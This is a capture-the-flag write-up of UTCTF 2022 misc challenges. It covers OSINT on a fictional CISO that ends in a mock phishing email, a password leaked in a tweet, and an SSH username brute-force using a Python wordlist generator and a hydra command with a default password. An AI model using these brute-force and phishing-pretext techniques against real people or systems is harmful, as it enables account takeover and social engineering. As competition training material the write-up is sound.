---
layout: post
title: "[UTCTF 2022] All Misc Challenges"
author: Dontmindme
---

# All Misc Challenges

In a slight depature from usual Maple Bacon practice, I will be discussing all misc challenges from UTCTF 2022 in one post.

# Osint Full

## Moral of the Challenge:

Emails should not be hardcoded into public repositories

## Challenge Description

For this challenge, we are tasked to OSINT a user named “eddking6” and to answer the following five questions in a phishing email sent to him:

The name of his dog?    
His favourite video game?     
His alma mater?    
His Role at his company?    
His favorite[^1] food?    
His Email?    

## Solution

A basic search of major social media accounts yields two accounts immediately:   
https://twitter.com/eddking6   
https://github.com/eddking6   

From these accounts, we can immediately discern that his favourite video game is Factorio, his favourite food is Cacio e Pepe (Cheese and Pepper), and he is a CISO at Blob Corp. Three down… three to go

At this point, we can take a closer look at his github account. He has a Go script to send email reminders to himself to feed his dog, Spot, and [has hardcoded his email in the repo](https://github.com/eddking6/DogFeedScheduler/blob/e76f938adc53997b4ed9769e2b1e103793f0b4ea/quickstart.go#L15).

```
func sendmail(srv gmail.Service, frommail string) {
	temp := []byte("From: 'me'\r\n" +
		"reply-to: blobcorpciso@gmail.com\r\n" +
		"To:  blobcorpciso@gmail.com\r\n" +
		"Subject: Feed Spot \r\n" +
		"remember to feed spot")

	var message gmail.Message

	message.Raw = base64.StdEncoding.EncodeToString(temp)
	message.Raw = strings.Replace(message.Raw, "/", "_", -1)
	message.Raw = strings.Replace(message.Raw, "+", "-", -1)
	message.Raw = strings.Replace(message.Raw, "=", "", -1)
	_, err := srv.Users.Messages.Send("me", &message).Do()
	if err != nil {
		log.Fatalf("Unable to send. %v", err)
	}
}
```

That’s two more questions answered. Finally, after checking other social media sites, we found Edd’s [LinkedIn account](https://www.linkedin.com/in/eddking6/), which lists him as a proud alumni of Texas A&M. 

With this, all six questions were answered:

The name of his dog: **Spot**    
His favourite video game: **Factorio**    
His alma mater: **Texas A&M**    
His Role at his company: **CISO**    
His favorite food: **Cacio e Pepe**    
His Email: **blobcorpciso@gmail.com**    

Now, all that’s left is to send him a phishing email and get Mr. King to hand over a flag

```
Hi Ed,

It’s me, your old friend! You know I am your old friend because I know that

Your dog’s name is Spot
Your favourite video game is Factorio
Your alma mater is Texas A&M
You are a CISO for Blob Corp
Your favourite food is Cacio e Pepe
And your email is blobcorpciso@gmail.com

Can I have a flag?
```

`utflag{osint_is_fun}`

# Public Panic I

## Moral of the Challenge:

Practice good OpSec and don't post passwords online

## Challenge Description:

For part 1 of this series of linked challenges, we are provided a website for Sagishi Tech at http://misc2.utctf.live:8756/, a company that seems to have settled for second best in the job market.[^2]

![Sagashi](/assets/images/utctf2022/Miscs/sagashi.png)

## Solution
There are links on this page to the twitter accounts of four employees of Sagishi Tech, however, none of their accounts seem to have any useful information. At this point, I decided to simply search on twitter “Sagishi Tech”, and lo and behold:

![Whiteboard](/assets/images/utctf2022/Miscs/WColdwater.png)
https://twitter.com/WadeColdwater/status/1501031410244669446

Looks like Wade here needs to review his Information Security training. Don’t skip those mandatory videos folks!

`Utflag{situational_awareness_is_key}`

# Public Panic II

## Moral of the Challenge:

SSH has no cooldowns or lockouts, and can be bruteforced

## Challenge Description:

Continuing on this challenge, we are given a port (misc2.utctf.live: 8622) and tasked with getting into Sagishi Tech systems. 

## Solution
Looking at the image above from Public Panic I, we can see that the default password for Sagishi Tech is defautlpw5678!. Now we need somewhere to use that password. Running nmap on the provided port tells us that it is a tcp port running ssh. Now, all we need is a username.

During various attempts at finding a username via OSINT techniques, we did find a list of all 11 employees of Sagishi Tech with a presence on twitter by way of Craig Wallace, who follows all of them. 

![Userlist](/assets/images/utctf2022/Miscs/listofusers.png)

However, it seemed like the only option was to bruteforce the username, assuming that Sagishi Tech uses standard corporate usernaming schemes. Though there are tools such as [Namebuster](https://github.com/benbusby/namebuster) out there that can do this for you, we opted to handwrite a Python script to the same effect

```
names = [
  ["Craig", "Wallace"],
  ["Claude", "Castillo"],
  ["Sidney", "Jaggers"],
  ["Misty", "Booker"],
  ["Wade", "Coldwater"],
  ["Debby", "Uselton"],
  ["Cliff", "Shackleford"],
  ["Neil", "Cline"],
  ["Robyn", "Swanson"],
  ["Britt", "Bryant"],
  ["Sherman", "Kern"],
]

u = open("usernames.txt", "w")

for i in names:
    u.write(i[0]+"\n")
    u.write(i[1]+"\n")
    u.write(i[0].lower()+"\n")
    u.write(i[1].lower()+"\n")
    u.write(i[0]+i[1]+"\n")
    u.write(i[1]+i[0]+"\n")
    u.write((i[0]+i[1]).lower()+"\n")
    u.write((i[1]+i[0]).lower()+"\n")
    u.write(i[0]+"."+i[1]+"\n")
    u.write(i[1]+"."+i[0]+"\n")
    u.write((i[0]+"."+i[1]).lower()+"\n")
    u.write((i[1]+"."+i[0]).lower()+"\n")
    u.write(i[0][0]+i[1]+"\n")
    u.write(i[1]+i[0][0]+"\n")
    u.write((i[0][0]+i[1]).lower()+"\n")
    u.write((i[1]+i[0][0]).lower()+"\n")
    u.write(i[1][0]+i[0]+"\n")
    u.write(i[0]+i[1][0]+"\n")
    u.write((i[1][0]+i[0]).lower()+"\n")
    u.write((i[0]+i[1][0]).lower()+"\n")
    u.write(i[0][0]+"."+i[1]+"\n")
    u.write(i[1]+"."+i[0][0]+"\n")
    u.write((i[0][0]+"."+i[1]).lower()+"\n")
    u.write((i[1]+"."+i[0][0]).lower()+"\n")
    u.write(i[1][0]+"."+i[0]+"\n")
    u.write(i[0]+"."+i[1][0]+"\n")
    u.write((i[1][0]+"."+i[0]).lower()+"\n")
    u.write((i[0]+"."+i[1][0]).lower()+"\n")
```

And then used [Hydra](https://github.com/vanhauser-thc/thc-hydra ) to test them against the port. 

`hydra -L usernames.txt -p defaultpw5678! -u  -s 8622  misc2.utctf.live ssh`

Turns out, the username is `cshackleford`, and the flag is in a txt file.

`utflag{convension_knowledge_for_the_win}`

# The Grumpy Genie:

## Moral of the Challenge: 

sometimes, you can just look the flag up

## Challenge Description:

We are provided a pastebin link https://pastebin.com/T7r9vFvg which contained a smart contract, and an address on what appears to be the ETH blockchain 0x867D66C78235CD6c989FbFA34606FcfF637fB613,and tasked with finding a flag. 

## Solution

We *could* have examined the pastebin code for vulnerabilities. 

We *could* have have found a retrancy vulnerability in the code and exploited it

We *could* have spent hours trying to figure this out.

Instead, one of our team members decided to spend 30 seconds on this challenge by just looking the flag up. 

## Looking it up
As a first step, we searched the address on Etherscan.io, which yielded no results. However, the search did tell us that it was on the Ropsten test network, which gave us some information on the contract:

![EthScan1](/assets/images/utctf2022/Miscs/ethscan1.png)

Clicking on the [earliest transaction](https://ropsten.etherscan.io/tx/0xca78d2d51101fda93f3f8c62f4349dd23a7e5692cef667ab834c3611601f068f), we can find the input data of the transaction. If we convert the input data provided into UTF-8 text, we can trivially find the flag

![EthScan2](/assets/images/utctf2022/Miscs/ethscan2.png)

`utflag{Did_Y0u_USe_Re3nTrancY?}`

No we did not, UTCTF. No we did not.

---
[^1]: In an obvious bid to appeal to their international audience, UT ISSS clearly decided to split the difference and spell favourite both ways. The gesture is appreciated. 
[^2]: It’s unclear what Sagishi does, but based on their name, I have some ideas. Something that starts with N, ends with T, and has three letters perhaps?
